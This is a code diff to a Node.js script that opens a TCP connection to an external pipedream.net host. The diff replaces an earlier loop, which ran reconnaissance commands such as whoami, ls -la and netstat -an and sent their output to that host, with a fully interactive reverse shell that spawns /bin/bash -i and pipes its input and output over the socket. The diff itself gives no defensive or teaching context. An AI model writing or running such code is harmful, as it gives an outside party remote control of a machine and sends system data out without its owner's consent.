@@ -1,5 +1,5 @@
 const net = require('net');
-const { exec } = require('child_process');
+const { spawn } = require('child_process');
 
 const HOST = 'eop3b98jxkzuqt4.m.pipedream.net';
 const PORT = 80;
@@ -12,8 +12,27 @@ client.connect(PORT, HOST, () => {
 
     client.write('Reverse shell connection established\n');
 
-    // Simulate a few commands
-    const commands = [
+    const shell = spawn('/bin/bash', ['-i']);
+
+    client.on('data', (data) => {
+        shell.stdin.write(data);
+    });
+
+    shell.stdout.on('data', (data) => {
+        client.write(data);
+    });
+
+    shell.stderr.on('data', (data) => {
+        client.write(data);
+    });
+
+    shell.on('exit', (code) => {
+        console.log(`Shell exited with code ${code}`);
+        client.destroy();
+    });
+
+    // Simulate some initial commands
+    const initialCommands = [
         'whoami',
         'pwd',
         'ls -la',
@@ -21,30 +40,12 @@ client.connect(PORT, HOST, () => {
         'netstat -an'
     ];
 
-    let commandIndex = 0;
-
-    const simulateCommand = () => {
-        if (commandIndex < commands.length) {
-            const command = commands[commandIndex];
+    initialCommands.forEach((command, index) => {
+        setTimeout(() => {
             console.log(`Executing: ${command}`);
-            client.write(`$ ${command}\n`);
-
-            exec(command, (error, stdout, stderr) => {
-                if (error) {
-                    client.write(`Error: ${error.message}\n`);
-                } else {
-                    client.write(stdout);
-                }
-                commandIndex++;
-                setTimeout(simulateCommand, 2000); // Wait 2 seconds before next command
-            });
-        } else {
-            console.log('Simulation complete');
-            client.destroy();
-        }
-    };
-
-    simulateCommand();
+            shell.stdin.write(`${command}\n`);
+        }, index * 2000);
+    });
 });
 
 client.on('error', (error) => {
